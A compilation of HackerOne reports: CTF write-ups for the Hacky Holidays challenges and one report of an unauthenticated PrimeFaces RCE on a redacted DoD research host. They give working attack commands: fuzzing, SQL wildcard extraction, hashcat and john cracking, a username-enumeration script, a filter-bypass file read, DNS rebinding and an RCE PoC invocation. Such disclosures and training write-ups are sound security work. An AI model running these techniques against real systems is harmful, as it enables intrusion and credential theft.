t2=requests.get("http://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=+searchdata")
if "Received: 404" not in t2.text:
print(t2.text, payloads)
Code 499 Bytes
1
2Now after fuzzing we got ```/user and /ping``` as a directory then again we used this time paramter bruteforcing after /user?+payloads which returned us with ```username and password```  as valid parameters now to exfil the values in api we can use % character which would return us with if value/ like  exists so for that we fuzzed with the same logic in iterations as 
3and payloads with alphanumeric  a-z0-9
4 username as /api/user?username=a%
5password as  /api/user?password=a% which gave values 
/api/user?username=grinchadmin%
/api/user?password=s4nt4sucks%
Code 643 Bytes
1
2Now after this we go to login page https://hackyholidays.h1ctf.com/attack-box and enter these credentials grinchadmin:s4nt4sucks we get our flag and final challenge .
3
4{F1131557}
5
6~~Grinch Recon Server Down~~
7
8### flag{07a03135-9778-4dee-a83c-7ec330728e72}
9
10# 12 Grinch HashingDns
11
12Now Grinch got superfrustrated and decided to launch his final DDOS attack to target he made a script that would launch an attack to ip he restricted it with a check if ip resolves first time as 127.0.0.1 then attack woul be aborted
13
14We began on https://hackyholidays.h1ctf.com/attack-box here we can see three ip and three urls so decoding 1st ip we can see 
15
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
https://hackyholidays.h1ctf.com/attack-box/launch?payload={"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
Code 356 Bytes
1
2each payload has ip and hash base64 encoded together if we manually try to change ip or change hashes the server would respond with
3``` Invalid Protection Hash```  so here needed to generate hash for an ip to do so we needed to now hash password that is used server side I tried using hashcat with  hash:salt format to get the password here ip is our salt
5f2940d65ca4140cc18d0878bc398955:203.0.113.33
2814f9c7311a82f1b822585039f62607:203.0.113.53
5aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213
Code 1.26 KiB
1this gave us 
2{F1131537} mrgrinch463 as password  now if we generate a hash and try IP such as 127.0.0.1 it would stop the attack detecting it as localhost here DNS rebinding will help us at first we need our IP to resolve to any ip other than localhost and then 127.0.0.1 here we use https://lock.cmpxchg8b.com/rebinder.html and enter IP1 as 192.168.0.1 and IP2 as 127.0.0.1 now we generate our hash using [Md5salthash](http://md5.my-addr.com/md5_salted_hash-md5_salt_hash_generator_tool.php) and then we encode the IP and send the payload this gives us back a attack URL upon loading after 2nd resolve this attacks 127.0.0.1 and thus we get our final flag & burn down whole grinch system and save the holidays
3
4## Steps:
51. Using hashcat crack the password with the command
6``` hashcat -a 0 -m 10 hash.txt ../../tools/payloads/wordlists/wordlistsl/rockyou.txt --show```
72.  Now we get password as ``` mrgrinch463``` 
83. Now we go to https://lock.cmpxchg8b.com/rebinder.html and generate a url for  dns rebinding 
9{F1131540}
10we get c0a80001.7f000001.rbndr.us 
114. Now to generate our hash we visit http://md5.my-addr.com/md5_salted_hash-md5_salt_hash_generator_tool.php and enter our url and password which generates us a hash of 60ff4921c1c7a927c06140d0a57c9d38 now we base64 encode this as
12
{"target":"c0a80001.7f000001.rbndr.us","hash":"60ff4921c1c7a927c06140d0a57c9d38"}
eyJ0YXJnZXQiOiJjMGE4MDAwMS43ZjAwMDAwMS5yYm5kci51cyIsImhhc2giOiI2MGZmNDkyMWMxYzdhOTI3YzA2MTQwZDBhNTdjOWQzOCJ9
Code 31 Bytes
1
25.Now we send this as payload 
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiJjMGE4MDAwMS43ZjAwMDAwMS5yYm5kci51cyIsImhhc2giOiI2MGZmNDkyMWMxYzdhOTI3YzA2MTQwZDBhNTdjOWQzOCJ9
Code 334 Bytes
1which redirects us to 
2{F1131543}  https://hackyholidays.h1ctf.com/attack-box/launch/d265d7796749f0d1ae59115fc9fef7a2
36.Upon  visiting the url we sucessfullly launch the attack against 127.0.0.1 and destroy grinch networks 
4{F1131544}
5
6{F1131545}
7
87.~~Take Down Grinch~~ 
9### flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}
10
11## Impact
12
13...



==================================================

Report File: 1067291.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Code Injection

Contents:

Summary:
The application at ████████/ftn-Website/ uses primefaces 5.3 but not 5.3.8, making it vulnerable to unauthenticated RCE CVE-2017-1000486.
Step-by-step Reproduction Instructions
Get the publicly available POC for this vulnerability here: https://github.com/pimps/CVE-2017-1000486
Execute: python primefaces.py ███/ftn-Website/ -c id
Success: uid=91(tomcat) gid=91(tomcat) groups=91(tomcat) context=system_u:system_r:tomcat_t:s0
Product, Version, and Configuration (If applicable)
primefaces 5.3
Suggested Mitigation/Remediation Actions
Update primefaces.
Impact
An unauthenticated, 3rd-party attacker or adversary can execute remote code on restsvr1.ftn.research.usafa.edu as the unix tomcat user. Note that this service uses a DoD IP, suggesting an attacker could potentially pivot elsewhere afterwards.



==================================================

Report File: 1067530.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- None

Contents:

Beginning
<image_0>
Challenge 1: Something to get started
I visited https://hackerone.com/h1-ctf to understand the scope of the target.
The main target is hackyholidays.h1ctf.com. When I visited the website I was presented a page with just an image and a video of snow.
As I do not what kind of web programming language is being used (like php, asp, python or any), I started by finding common files in web, for this I used gobuster and wordlist from Seclists.
Code 1014 Bytes
1┌─[shubham@parrot]─[~]
2└──╼ $gobuster dir -u https://hackyholidays.h1ctf.com/ -w /opt/SecLists/Discovery/Web-Content/raft-small-files.txt 
3===============================================================
4Gobuster v3.0.1
5by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
6===============================================================
7[+] Url:            https://hackyholidays.h1ctf.com/
8[+] Threads:        10
9[+] Wordlist:       /opt/SecLists/Discovery/Web-Content/raft-small-files.txt
10[+] Status codes:   200,204,301,302,307,401,403
11[+] User Agent:     gobuster/3.0.1
12[+] Timeout:        10s
13===============================================================
142020/12/12 09:50:10  Starting gobuster
15===============================================================
16/favicon.ico (Status: 200)
17/robots.txt (Status: 200)
18===============================================================
192020/12/12 09:56:36  Finished
20===============================================================
21┌─[shubham@parrot]─[~]
22└──╼ $
I found 2 files, favicon.ico and robots.txt. favicon.ico is favicon that it is a file containing small icon associated with particular website. Next is robots.txt, It is a file used to instruct web robots (search engines like google) how to crawl web pages on website. So, this file may contain some information. So, I browsed https://hackyholidays.h1ctf.com/robots.txt
Code 85 Bytes
1User-agent: *
2Disallow: /s3cr3t-ar3a
3Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}
And I got the flag.
Challenge 2: Dig deeper
In previous challenge there was a disallowed entry in robots.txt file, so on browsing https://hackyholidays.h1ctf.com/s3cr3t-ar3a I get the following the contents.
<image_1>
Code 281 Bytes
1<div class="alert alert-danger text-center" id="alertbox" data-info="flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}" next-page="/apps">
2        <p>I've moved this page to keep people out!</p>
3        <p>If you're allowed access you'll know where to look for the proper page!</p>
4</div>
Challenge 3: People Rater
Description: The grinch likes to keep lists of all the people he hates. This year he's gone digital but there might be a record that doesn't belong!
On browsing https://hackyholidays.h1ctf.com/people-rater I got bunch of names of people, upon clicking any I got a popup saying “Aweful“, so I started looking at source code of page and found that the sends an request to /people-rater/entry?id= with our supplied id.
Code 248 Bytes
1$('.thelist').on("click", "a", function(){
2        $.getJSON('/people-rater/entry?id=' + $(this).attr('data-id'), function(resp){
3            alert( resp.rating );
4        }).fail(function(){
5            alert('Request failed');
6        });
7    });
So, I started intercepting the requests with burp suite, upon clicking first name I got this request GET /people-rater/entry?id=eyJpZCI6Mn0=. That seems a base64 encoding so I went to decoder section of burp suite and decoded it as base64, I got a value as {"id":2} , as it is starting with 2 I must check the result of {"id":1} so I base64 encoded it eyJpZCI6MX0= and sent it with id parameter in request as this parameter is controlled by us.
Code 296 Bytes
1HTTP/1.1 200 OK
2Server: nginx/1.18.0 (Ubuntu)
3Date: Fri, 15 Dec 2020 05:18:04 GMT
4Content-Type: application/json
5Connection: close
6Content-Length: 135
7 
8{
9 "id":"eyJpZCI6MX0=",
10 "name":"The Grinch",
11"rating":"Amazing in every possible way!",
12 "flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"
13}
And got the flag.
Challenge 4: Swag Shop
Description: Get your Grinch Merch! Try and find a way to pull the Grinch's personal details from the online shop.
I browsed https://hackyholidays.h1ctf.com/swag-shop and there were some items with purchase button, upon clicking purchase I got a login prompt so I started intercepting requests and see where my requests were being sent. Upon intercepting first request I got /swag-shop/api/purchase with an id and second login request was being sent to /swag-shop/api/login with username and password. As i saw there is an api in play so I started finding all endpoints using gobuster and wordlist from Seclists.
Code 1.05 KiB
1┌─[shubham@parrot]─[~]
2└──╼ $gobuster dir -u https://hackyholidays.h1ctf.com/swag-shop/api/ -w /opt/SecLists/Discovery/Web-Content/api/objects.txt --statuscodesblacklist 404
3===============================================================
4Gobuster v3.0.1
5by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
6===============================================================
7[+] Url:                     https://hackyholidays.h1ctf.com/swag-shop/api/
8[+] Threads:                 10
9[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/api/objects.txt
10[+] Negative Status codes:   404
11[+] User Agent:              gobuster/3.0.1
12[+] Timeout:                 10s
13===============================================================
142020/12/16 11:05:39  Starting gobuster
15===============================================================
16/sessions (Status: 200)
17/user (Status: 400)
18===============================================================
192020/12/16 11:07:34  Finished
20===============================================================
21┌─[shubham@parrot]─[~]
22└──╼ $
I used –statuscodesblacklist option because by default gobuster uses some predefined codes as filter and as I was finding api can give different response like in this case status 400 which is being filtered in gobuster by default.
Here, I got 2 new endpoints sessions and user, I browsed https://hackyholidays.h1ctf.com/swag-shop/api/sessions and I got aresponse with bunch of sessions.
Code 2.15 KiB
1{"sessions":
2[
3"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=",
4"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=",
5"eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==",
6"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=",
7"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=",
8"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=",
9"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=",
10"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0="
11]}
I got base64 encoded sessions, so I have decoded and got user
Code 1.40 KiB
1"{"user":null,"cookie":"ZjM2MzNjM2JkZGUyMzVmMmY2ZjcxNjdlNDNmZjQwZTlmY2RhNjYxNWM5Y2Y1ZjY2ODU3NjkxMTQ2Nzk0ZmIxOWZhN2ZhZjg0Y2E5Nzk1NTQ2MzMzZTc0MWJlMzVhZDA0MDUwYmQ3NDlmZTE4MmNkMjMxMzU0MWRlMTJhNWYzOGQ="}",
2"{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}",
3"{"user":null,"cookie":"MDRmYTBhN2FiNjY5MGFlOWFmYTE4ZjE2N2JjZmYzZWJkOTRlOGYwMjI1OGIyNjM1ODU0Njc2YTdlZTM4MzFiM2I1MTUzMzViMjFhYzVkMTc4ODE3OGM4Y2JlOTk4MjJlMDI2YjQzZDQxMGNmNTg1ODQxZjBmODBmZWQxZmE1YmE="}",
4"{"user":null,"cookie":"M2Q2MDIzNDg5MWE0N2M3NDJmNTIyNGM3NWUxYWQ0NDRlZWI3MTg4MjI3ZGRkMTllZTM2ZDkxMGVlNWEwNmZiZWFkZjZhODg4MDY3ODlmZGRhYTM1Y2IyMGVhMjA1NjdiNDFjYzBhMWQ4NDU1MDc4NDE1YmI5YTJjODBkMjFmN2Y="}",
5"{"user":null,"cookie":"MWY3MTAzMTBjZGY4ZGMwYjI3Zjk2ZmYzMWJlMWEyZTg1YzE0MmZlZjMwYmJjZmQ4ZTU0Y2YxYzVmZTM1N2Q1ODY2YjFkZmFiNmI5ZjI1M2M2MDViNjA0ZjFjNDVkNTQ4N2U2ODdiNTJlMmFiMTExODA4MjU2MzkxZWNhNjFkNmU="}",
6"{"user":null,"cookie":"MDM4YzhiN2Q3MmY0YjU2M2FkZmFlNDMwMTI5MjEyODhlNGFkMmI5OTcyMDlkNTJhZTc4YjUxZjIzN2Q4NmRjNjg2NmU1MzVlOWEzOTE5NWYyOTcwNmJlZDIyNDgyMTA5ZDA1OTliMTYyNDczNjFkZmU0MTgxYWEwMDU1ZWNhNzQ="}",
7"{"user":null,"cookie":"OGI3N2ExOGVjNzM1ZWVmNTk2ZjNkZjIwM2ZjYzdjMWNhODg4NDhhODRmNjI0NDRjZTdlZTg0ZTUwNzZmZDdkYTJjN2IyODY5YjcxZmI5ZGRiYTgzZjhiZDViOWZjMTVlZDgzMTBkNzNmODI0OTM5ZDM3Y2JjZmY4NzEyOGE3NTM="}"
I also had an endpoint as /api/user so I browsed that ( /swag-shop/api/user ) and got an error saying {"error":"Missing required fields"}
I was missing some parameter like /swag-shop/api/user?parameter=value, using wfuzz to find parameters.
Code 958 Bytes
1┌─[shubham@parrot]─[~]
2└──╼ $wfuzz -u https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ=value -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt --hw 3
3********************************************************
4* Wfuzz 3.0.1 - The Web Fuzzer                         *
5********************************************************
6Target: https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ=value
7Total requests: 2588
8===================================================================
9ID           Response   Lines    Word     Chars       Payload                                                                              
10===================================================================
11000001359:   404        0 L      5 W      40 Ch       "uuid"                                                                               
12Total time: 0
13Processed Requests: 2588
14Filtered Requests: 2587
15Requests/sec.: 0
16┌─[shubham@parrot]─[~]
17└──╼ $
--hw 3 to filter out results containing above errors. I found an valid parameter uuid and recently got a valid username. Using that and browsing /swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 and got the flag and details of grinch.
Code 252 Bytes
1{
2 "uuid":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
3"username":"grinch",
4"address":{
5     "line_1":"The Grinch",
6     "line_2":"The Cave",
7     "line_3":"Mount Crumpit",
8     "line_4":"Whoville"
9     },
10"flag":"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"
11}
Challenge 5: Secure Login
Description: Try and find a way past the login page to get to the secret area.
I got a login page on browsing https://hackyholidays.h1ctf.com/secure-login, I tried to enter some default credentials like admin and password but got an error saying “Invalid Username”, here webpage was telling me which username is valid and which is invalid, so I can enumerate valid usernames by brute forcing. I have written a python script to do it (We can use tools like hydra but I like writing code for it).
Code 496 Bytes
1import requests
2	 
3url = "https://hackyholidays.h1ctf.com/secure-login"
4users = open("/opt/SecLists/Usernames/Names/names.txt","r")
5header= { "Content-Type": "application/x-www-form-urlencoded" }
6	 
7for line in users:
8    user = line.rstrip()
9    data = f"username={user}&password=admin"
10    print(f"Trying : {user}       ",end='\r', flush=True)
11    r = requests.post(url, data=data, headers=header)
12    if "Invalid Username" not in r.text:
13        print(f“Found Username : {user}”)
14        break
<image_2>
Code 1.04 KiB
1┌─[✗]─[shubham@parrot]─[~/hackyholidays/securelogin]
2└──╼ $zip2john my_secure_files_not_for_you.zip > hash
3ver 2.0 efh 5455 efh 7875 my_secure_files_not_for_you.zip/xxx.png PKZIP Encr: 2b chk, TS_chk, cmplen=215105, decmplen=215058, crc=277DEE70
4ver 1.0 efh 5455 efh 7875 my_secure_files_not_for_you.zip/flag.txt PKZIP Encr: 2b chk, TS_chk, cmplen=55, decmplen=43, crc=9DE7C581
5NOTE: It is assumed that all files in each archive have the same password.
6If that is not the case, the hash may be uncrackable. To avoid this, use
7option -o to pick a file at a time.
8┌─[shubham@parrot]─[~/hackyholidays/securelogin]
9└──╼ $john --wordlist=/usr/share/wordlists/rockyou.txt hash
10Using default input encoding: UTF-8
11Loaded 1 password hash (PKZIP [32/64])
12Will run 4 OpenMP threads
13Press 'q' or Ctrl-C to abort, almost any other key for status
14hahahaha         (my_secure_files_not_for_you.zip)
151g 0:00:00:00 DONE (2020-12-18 12:41) 33.33g/s 546133p/s 546133c/s 546133C/s total90..cocoliso
16Use the "--show" option to display all of the cracked passwords reliably
17Session completed
First, I extracted the hash from compressed file using zip2john, then I used john with rockyou.txt wordlist to crack the hash.
Code 432 Bytes
1┌─[shubham@parrot]─[~/hackyholidays/securelogin]
2└──╼ $unzip my_secure_files_not_for_you.zip 
3Archive:  my_secure_files_not_for_you.zip
4[my_secure_files_not_for_you.zip] xxx.png password: 
5  inflating: xxx.png                 
6 extracting: flag.txt                
7┌─[shubham@parrot]─[~/hackyholidays/securelogin]
8└──╼ $cat flag.txt 
9flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
10┌─[shubham@parrot]─[~/hackyholidays/securelogin]
11└──╼ $
And got the flag.
Challenge 6: My Diary
Description: Hackers! It looks like the Grinch has released his Diary on Grinch Networks. We know he has an upcoming event but he hasn't posted it on his calendar. Can you hack his diary and find out what it is?
First thing to notice browsing https://hackyholidays.h1ctf.com/my-diary/, the url gets replaces to /my-diary/?template=entries.html. This indicates it is including the file “entries.html” in response. I started finding files present on webserver.
Code 1.04 KiB
1┌─[shubham@parrot]─[~/hackyholidays/mydiary]
2└──╼ $gobuster dir -u https://hackyholidays.h1ctf.com/my-diary/ -w /opt/SecLists/Discovery/Web-Content/raft-small-files.txt 
3===============================================================
4Gobuster v3.0.1
5by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
6===============================================================
7[+] Url:            https://hackyholidays.h1ctf.com/my-diary/
8[+] Threads:        10
9[+] Wordlist:       /opt/SecLists/Discovery/Web-Content/raft-small-files.txt
10[+] Status codes:   200,204,301,302,307,401,403
11[+] User Agent:     gobuster/3.0.1
12[+] Timeout:        10s
13===============================================================
142020/12/17 23:04:35  Starting gobuster
15===============================================================
16/index.php (Status: 302)
17/. (Status: 302)
18===============================================================
192020/12/17 23:10:15  Finished
20===============================================================
21┌─[shubham@parrot]─[~/hackyholidays/mydiary]
22└──╼ $
This indicates index.php file is present on webserver, on browsing index.php, got a source code of index.php file.
Code 763 Bytes
1<?php
2if( isset($_GET["template"])  ){
3        $page = $_GET["template"];
4         //remove non allowed characters
5         $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
6         //protect admin.php from being read
7         $page = str_replace("admin.php","",$page);
8        //I've changed the admin file to secretadmin.php for more security!
9        $page = str_replace("secretadmin.php","",$page);
10        //check file exists
11       if( file_exists($page) ){
12              echo file_get_contents($page);
13        }else{
14             //redirect to home
15              header("Location: /my-diary/?template=entries.html");
16              exit();
17         }
18}else{
19        //redirect to home
20        header("Location: /my-diary/?template=entries.html");
21exit();
Description about code:
First it checks if it gets any data on GET parameter template, if it gets some data it removes any special character(regular expression used to find any character which is not in a-z, A-Z and 0-9 and replace it with nothing), so we can’t use any special character.
Next it replaces any occurrences of string admin.php in data with nothing.
And then it replaces any occurrences of string secretadmin.php in data with nothing.
It then checks if the page exists or not, if exits it shows contents of that page and exits if the page does not exist it redirects to home page and exits.
In order to get contents of secretadmin.php we can make use of it’s replace function. The replacement only applies once. To explain this in detail, I am using php interactive mode php -a command. Goal is to get secretadmin.php at last.
Code 429 Bytes
1┌─[shubham@parrot]─[~/hackyholidays/mydiary]
2└──╼ $php -a
3Interactive mode enabled
4
5php > echo preg_replace('/([^a-zA-Z0-9.])/','',"secretasecretaadmin.phpdmin.phpdmin.php");
6secretasecretaadmin.phpdmin.phpdmin.php
7php > echo str_replace("admin.php","","secretasecretaadmin.phpdmin.phpdmin.php");
8secretasecretadmin.phpdmin.php
9php > echo str_replace("secretadmin.php","","secretasecretadmin.phpdmin.php");
10secretadmin.php
11php > 
I sent secretasecretaadmin.phpdmin.phpdmin.php as data, this string does not contain any special character the preg_replace does not affect the data.
On first replace it replaces any occurrences admin.php with nothing so makes data as secretasecretadmin.phpdmin.php.
And finally, when it replaces any occurrences of secretadmin.php with nothing, the final result becomes secretadmin.php.
On browsing https://hackyholidays.h1ctf.com/my-diary/?template=secretasecretaadmin.phpdmin.phpdmin.php got the flag.
<image_3>
Challenge 7: Hate Mail Generator
Description: Sending letters is so slow! Now the grinch sends his hate mail by email campaigns! Try and find the hidden flag!
On browsing https://hackyholidays.h1ctf.com/hate-mail-generator, got the following page.
<image_4>
Code 845 Bytes
1POST /hate-mail-generator/new/preview HTTP/1.1
2Host: hackyholidays.h1ctf.com
3Connection: close
4Content-Length: 125
5Cache-Control: max-age=0
6Upgrade-Insecure-Requests: 1
7Origin: https://hackyholidays.h1ctf.com
8Content-Type: application/x-www-form-urlencoded
9User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
10Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
11Sec-Fetch-Site: same-origin
12Sec-Fetch-Mode: navigate
13Sec-Fetch-User: ?1
14Sec-Fetch-Dest: document
15Referer: https://hackyholidays.h1ctf.com/hate-mail-generator/new
16Accept-Encoding: gzip, deflate
17Accept-Language: en-US,en;q=0.9
18	 
19preview_markup=Hello {{name}} ....&preview_data={"name":"Alice","email":"alice@test.com"}
New parameter preview_data with some predefined value. From predefined message from grinch 'templateparameter was used, so I tried including it with some random value and sending request with datapreview_markup={{template:abc}}&preview_data={"name":"Alice","email":"alice@test.com"}and got response asCannot find template file /templates/abcindicating it is fetching from /templates directory, so I browsed [https://hackyholidays.h1ctf.com/hate-mail-generator/templates/][12] and got some templates. {F1132391} I already know the templates from grinch from predefined message so my aim is to get template38dhs_admins_only_header.htmlso I tried including it using request datapreview_markup={{template:38dhs_admins_only_header.html}}&preview_data={"name":"Alice","email":"alice@test.com"}but got a responseYou do not have access to the file 38dhs_admins_only_header.html` so need to bypass the restriction to include that template.
<image_5>
Challenge 8: Forum
<image_6>
Code 1.07 KiB
1┌─[shubham@parrot]─[~/hackyholidays/forum]
2└──╼ $gobuster dir -u https://hackyholidays.h1ctf.com/forum -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -t 50
3===============================================================
4Gobuster v3.0.1
5by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
6===============================================================
7[+] Url:            https://hackyholidays.h1ctf.com/forum
8[+] Threads:        50
9[+] Wordlist:       /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
10[+] Status codes:   200,204,301,302,307,401,403
11[+] User Agent:     gobuster/3.0.1
12[+] Timeout:        10s
13===============================================================
142020/12/22 09:38:43 Starting gobuster
15===============================================================
16/login (Status: 200)
17/1 (Status: 200)
18/2 (Status: 200)
19/phpmyadmin (Status: 200)
20===============================================================
212020/12/22 09:43:05 Finished
22===============================================================
23┌─[shubham@parrot]─[~/hackyholidays/forum]
24└──╼ $
As I did not have any credentials, I was completely lost here so looked at tweets from hackerone and there was comment that this was created by @adamtlangley so I started looking at his github profile and found an interesting thing here
<image_7>
So I cloned it locally, whenever I get any repository first thing to check is always the history.
Code 1.21 KiB
1┌─[shubham@parrot]─[~/hackyholidays/forum]
2└──╼ $git clone https://github.com/Grinch-Networks/forum
3Cloning into 'forum'...
4remote: Enumerating objects: 46, done.
5remote: Counting objects: 100% (46/46), done.
6remote: Compressing objects: 100% (26/26), done.
7remote: Total 46 (delta 17), reused 39 (delta 13), pack-reused 0
8Receiving objects: 100% (46/46), 11.55 KiB | 5.78 MiB/s, done.
9Resolving deltas: 100% (17/17), done.
10┌─[shubham@parrot]─[~/hackyholidays/forum]
11└──╼ $cd forum
12┌─[shubham@parrot]─[~/hackyholidays/forum/forum]
13└──╼ $git log
14commit d865b522fb91ecd286e573687ec8c7df2abd13ba (HEAD -> main, origin/main, origin/HEAD)
15Author: Adam <adam@umbrella.info>
16Date:   Mon Dec 7 17:15:58 2020 +0000
17
18    Added user login and session management
19
20commit efb92ef3f561a957caad68fca2d6f8466c4d04ae
21Author: Adam <adam@umbrella.info>
22Date:   Mon Dec 7 16:36:07 2020 +0000
23
24    small fix
25
26commit 07799dce61d7c3add39d435bdac534097de404dc
27Author: Adam <adam@umbrella.info>
28Date:   Mon Dec 7 16:33:32 2020 +0000
29
30    Initial Code Commit
31
32commit 8adaca3ae2e412b163bb44a4b6d94b0a57398d02
33Author: adamtlangley <adamtlangley@gmail.com>
34Date:   Mon Dec 7 14:20:49 2020 +0000
35
36    Initial commit
37┌─[shubham@parrot]─[~/hackyholidays/forum/forum]
38└──╼ $
Found a commit with comment small fix so instantly checked
Code 1.03 KiB
1┌─[shubham@parrot]─[~/hackyholidays/forum/forum]
2└──╼ $git show efb92ef3f561a957caad68fca2d6f8466c4d04ae
3commit efb92ef3f561a957caad68fca2d6f8466c4d04ae
4Author: Adam <adam@umbrella.info>
5Date:   Mon Dec 7 16:36:07 2020 +0000
6
7    small fix
8
9diff --git a/models/Db.php b/models/Db.php
10index 5bea1f5..1dc435c 100755
11--- a/models/Db.php
12+++ b/models/Db.php
13 -131,7 +131,7  class Db {
14      */
15     static public function read(){
16         if( gettype(self::$read) == 'string' ) {
17-            self::$read = new DbConnect( false, 'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );
18+            self::$read = new DbConnect( false, '', '','' );
19         }
20         return self::$read;
21     }
22 -146,7 +146,7 class Db {
23      */
24     static public function write(){
25         if( gettype(self::$write) == 'string' ) {
26-            self::$write = new DbConnect( true,  'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );
27+            self::$write = new DbConnect( true,  '', '','' );
28         }
29         return self::$write;
30     }
31┌─[shubham@parrot]─[~/hackyholidays/forum/forum]
32└──╼ $
Database password in plain text. Recently I also got phpmyadmin directory and it’s administration tool for MySQL and MariaDB so used this credentials to login there.
